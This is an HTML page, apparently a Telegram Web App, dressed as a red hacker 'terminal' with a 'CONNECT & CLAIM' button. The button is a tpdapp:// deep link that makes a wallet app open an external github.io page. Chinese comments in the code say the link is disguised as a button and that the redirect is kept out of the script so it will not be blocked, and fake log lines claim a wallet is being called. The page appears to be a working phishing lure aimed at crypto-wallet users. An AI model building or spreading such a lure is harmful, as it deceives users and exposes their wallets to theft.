<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>TERMINAL</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body { background-color: #000; color: #ff0000; font-family: 'Courier New', monospace; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        #terminal { width: 90%; border: 1px solid #ff0000; padding: 15px; background: rgba(15, 0, 0, 0.9); box-shadow: 0 0 10px #ff0000; font-size: 13px; }
        /* 关键：把链接伪装成按钮 */
        .btn-link {
            display: inline-block;
            margin-top: 30px;
            padding: 20px 50px;
            background: #ff0000;
            color: #000;
            text-decoration: none;
            font-weight: bold;
            border-radius: 4px;
            text-transform: uppercase;
            box-shadow: 0 0 20px rgba(255, 0, 0, 0.5);
            text-align: center;
        }
        .log-line { color: #0f0; margin: 5px 0; }
    </style>
</head>
<body>

    <div id="terminal">
        <div style="font-weight: bold; margin-bottom: 10px;">[ SYSTEM_READY ]</div>
        <div id="display">
            <p class="log-line">> PROTOCOL: TPDAPP_DETECTED</p>
            <p class="log-line">> STATUS: AWAITING_USER_LINK_CLICK</p>
        </div>
    </div>

    <a href="tpdapp://open?params=%7B%22url%22%3A%22https%3A%2F%2Fpatrickdafhao-code.github.io%2Fcook%2F%22%7D" 
       class="btn-link" 
       id="gateBtn">
        CONNECT & CLAIM
    </a>

    <script>
        const tg = window.Telegram.WebApp;
        tg.ready();
        tg.expand();

        // 这里的脚本只负责震动，不负责跳转，这样就不会被拦截
        document.getElementById('gateBtn').addEventListener('click', function() {
            tg.HapticFeedback.notificationOccurred('success');
            document.getElementById('display').innerHTML += '<p class="log-line">> [OS]: CALLING_WALLET_APP...</p>';
        });
    </script>
</body>
</html>
